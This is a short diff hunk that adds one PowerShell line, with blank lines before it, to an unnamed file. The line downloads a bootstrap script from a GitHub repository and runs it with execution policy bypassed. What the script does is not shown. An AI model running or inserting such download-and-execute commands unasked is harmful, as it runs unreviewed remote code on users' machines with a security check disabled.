@@ -1,0 +1,4 @@
+
+
+
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/bensonlabs/HW-Summer/v2026-summer/scripts/bootstrap.ps1 -OutFile $env:TEMP\hw-summer-bootstrap.ps1; & $env:TEMP\hw-summer-bootstrap.ps1"
